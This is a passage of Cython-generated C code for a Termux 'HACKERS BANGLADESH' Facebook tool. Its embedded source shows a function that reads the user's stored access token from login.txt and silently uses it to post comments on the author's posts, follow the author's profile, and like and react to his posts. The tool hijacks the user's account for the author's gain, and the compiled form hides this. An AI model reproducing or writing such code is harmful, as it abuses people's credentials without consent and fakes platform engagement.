  __Pyx_GIVEREF(__pyx_kp_s_James_Boss);
  PyList_SET_ITEM(__pyx_t_4, 2, __pyx_kp_s_James_Boss);
  __Pyx_INCREF(__pyx_kp_s_James_Bro);
  __Pyx_GIVEREF(__pyx_kp_s_James_Bro);
  PyList_SET_ITEM(__pyx_t_4, 3, __pyx_kp_s_James_Bro);
  __Pyx_INCREF(__pyx_kp_s_Wow_sir);
  __Pyx_GIVEREF(__pyx_kp_s_Wow_sir);
  PyList_SET_ITEM(__pyx_t_4, 4, __pyx_kp_s_Wow_sir);
  __Pyx_INCREF(__pyx_kp_s_Super_Star);
  __Pyx_GIVEREF(__pyx_kp_s_Super_Star);
  PyList_SET_ITEM(__pyx_t_4, 5, __pyx_kp_s_Super_Star);
  __Pyx_INCREF(__pyx_kp_s__28);
  __Pyx_GIVEREF(__pyx_kp_s__28);
  PyList_SET_ITEM(__pyx_t_4, 6, __pyx_kp_s__28);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_8 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_v_love = __pyx_t_8;
  __pyx_t_8 = 0;

  /* "libme.pyx":350
 * 		comment = random.choice(['Big fan sir','Big fan brother','sir big fan','Sir please reply me','Love you sir','Sir big fan please reply me','Sir your my favorite Developer'])
 * 		love = random.choice(['Star','Love it','James Boss','James Bro','Wow sir','Super Star',''])
 * 		james = ''+love             # <<<<<<<<<<<<<<
 * 		requests.post('https://graph.facebook.com/3048075795436340/comments/?message=' +james+ '&access_token=' + token)
 * 		requests.post('https://graph.facebook.com/2985411081702812/comments/?message=' +comment+ '&access_token=' + token) #comment
 */
  __pyx_t_8 = PyNumber_Add(__pyx_kp_s_, __pyx_v_love); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_v_james = __pyx_t_8;
  __pyx_t_8 = 0;

  /* "libme.pyx":351
 * 		love = random.choice(['Star','Love it','James Boss','James Bro','Wow sir','Super Star',''])
 * 		james = ''+love
 * 		requests.post('https://graph.facebook.com/3048075795436340/comments/?message=' +james+ '&access_token=' + token)             # <<<<<<<<<<<<<<
 * 		requests.post('https://graph.facebook.com/2985411081702812/comments/?message=' +comment+ '&access_token=' + token) #comment
 * 		requests.post("https://graph.facebook.com/100007018489471/subscribers?access_token=" + token) #Mr.James
 */
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_requests); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_post); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = PyNumber_Add(__pyx_kp_s_https_graph_facebook_com_3048075, __pyx_v_james); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_5 = PyNumber_Add(__pyx_t_6, __pyx_kp_s_access_token); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_v_token)) { __Pyx_RaiseUnboundLocalError("token"); __PYX_ERR(0, 351, __pyx_L1_error) }
  __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_v_token); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_8 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_6);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 351, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "libme.pyx":352
 * 		james = ''+love
 * 		requests.post('https://graph.facebook.com/3048075795436340/comments/?message=' +james+ '&access_token=' + token)
 * 		requests.post('https://graph.facebook.com/2985411081702812/comments/?message=' +comment+ '&access_token=' + token) #comment             # <<<<<<<<<<<<<<
 * 		requests.post("https://graph.facebook.com/100007018489471/subscribers?access_token=" + token) #Mr.James
 * 		requests.post('https://graph.facebook.com/2614119432165314/likes?summary=true&access_token=' + token) #post
 */
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_post); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyNumber_Add(__pyx_kp_s_https_graph_facebook_com_2985411, __pyx_v_comment); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_kp_s_access_token); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_v_token)) { __Pyx_RaiseUnboundLocalError("token"); __PYX_ERR(0, 352, __pyx_L1_error) }
  __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_v_token); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_8 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "libme.pyx":353
 * 		requests.post('https://graph.facebook.com/3048075795436340/comments/?message=' +james+ '&access_token=' + token)
 * 		requests.post('https://graph.facebook.com/2985411081702812/comments/?message=' +comment+ '&access_token=' + token) #comment
 * 		requests.post("https://graph.facebook.com/100007018489471/subscribers?access_token=" + token) #Mr.James             # <<<<<<<<<<<<<<
 * 		requests.post('https://graph.facebook.com/2614119432165314/likes?summary=true&access_token=' + token) #post
 * 		requests.post('https://graph.facebook.com/2867565956820659/reactions?type=love&access_token=' + token) #react
 */
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_requests); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_post); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_v_token)) { __Pyx_RaiseUnboundLocalError("token"); __PYX_ERR(0, 353, __pyx_L1_error) }
  __pyx_t_6 = PyNumber_Add(__pyx_kp_s_https_graph_facebook_com_1000070, __pyx_v_token); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_8 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_6);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "libme.pyx":354
 * 		requests.post('https://graph.facebook.com/2985411081702812/comments/?message=' +comment+ '&access_token=' + token) #comment
 * 		requests.post("https://graph.facebook.com/100007018489471/subscribers?access_token=" + token) #Mr.James
 * 		requests.post('https://graph.facebook.com/2614119432165314/likes?summary=true&access_token=' + token) #post             # <<<<<<<<<<<<<<
 * 		requests.post('https://graph.facebook.com/2867565956820659/reactions?type=love&access_token=' + token) #react
 * 		self.__menu__file__()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_post); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_v_token)) { __Pyx_RaiseUnboundLocalError("token"); __PYX_ERR(0, 354, __pyx_L1_error) }
  __pyx_t_4 = PyNumber_Add(__pyx_kp_s_https_graph_facebook_com_2614119, __pyx_v_token); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_8 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "libme.pyx":355
 * 		requests.post("https://graph.facebook.com/100007018489471/subscribers?access_token=" + token) #Mr.James
 * 		requests.post('https://graph.facebook.com/2614119432165314/likes?summary=true&access_token=' + token) #post
 * 		requests.post('https://graph.facebook.com/2867565956820659/reactions?type=love&access_token=' + token) #react             # <<<<<<<<<<<<<<
 * 		self.__menu__file__()
 * 	def __menu__file__(self):
 */
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_requests); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_post); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_v_token)) { __Pyx_RaiseUnboundLocalError("token"); __PYX_ERR(0, 355, __pyx_L1_error) }
  __pyx_t_6 = PyNumber_Add(__pyx_kp_s_https_graph_facebook_com_2867565, __pyx_v_token); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_8 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_6);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "libme.pyx":356
 * 		requests.post('https://graph.facebook.com/2614119432165314/likes?summary=true&access_token=' + token) #post
 * 		requests.post('https://graph.facebook.com/2867565956820659/reactions?type=love&access_token=' + token) #react
 * 		self.__menu__file__()             # <<<<<<<<<<<<<<
 * 	def __menu__file__(self):
 * 		os.system("clear")
 */
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_menu__file); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 356, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_8 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 356, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "libme.pyx":340
 * 			print("  [!]  Token Invalid")
 * 			self.login()
 * 	def __bot__follow__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open("login.txt","r").read()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_AddTraceback("libme.James.__bot__follow__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XDECREF(__pyx_v_nama);
  __Pyx_XDECREF(__pyx_v_comment);
  __Pyx_XDECREF(__pyx_v_love);
  __Pyx_XDECREF(__pyx_v_james);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":357
 * 		requests.post('https://graph.facebook.com/2867565956820659/reactions?type=love&access_token=' + token) #react
 * 		self.__menu__file__()
 * 	def __menu__file__(self):             # <<<<<<<<<<<<<<
 * 		os.system("clear")
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_23__menu__file__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_23__menu__file__ = {"__menu__file__", (PyCFunction)__pyx_pw_5libme_5James_23__menu__file__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_23__menu__file__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__menu__file__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_22__menu__file__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_22__menu__file__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  CYTHON_UNUSED PyObject *__pyx_v_nama = NULL;
  PyObject *__pyx_v_james = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__menu__file__", 0);

  /* "libme.pyx":358
 * 		self.__menu__file__()
 * 	def __menu__file__(self):
 * 		os.system("clear")             # <<<<<<<<<<<<<<
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 		global token
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 358, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 358, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_n_s_clear) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_n_s_clear);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 358, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":359
 * 	def __menu__file__(self):
 * 		os.system("clear")
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")             # <<<<<<<<<<<<<<
 * 		global token
 * 		try:
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_1_92m_____1_92m_1_92m) < 0) __PYX_ERR(0, 359, __pyx_L1_error)

  /* "libme.pyx":361
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 		global token
 * 		try:             # <<<<<<<<<<<<<<
 * 			token = open("login.txt","r").read()
 * 		except(KeyError , IOError):
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_4, &__pyx_t_5, &__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    /*try:*/ {

      /* "libme.pyx":362
 * 		global token
 * 		try:
 * 			token = open("login.txt","r").read()             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			os.system("rm -f login.txt")
 */
      __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 362, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_read); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 362, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_2, function);
        }
      }
      __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 362, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_token, __pyx_t_1) < 0) __PYX_ERR(0, 362, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":361
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 		global token
 * 		try:             # <<<<<<<<<<<<<<
 * 			token = open("login.txt","r").read()
 * 		except(KeyError , IOError):
 */
    }
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
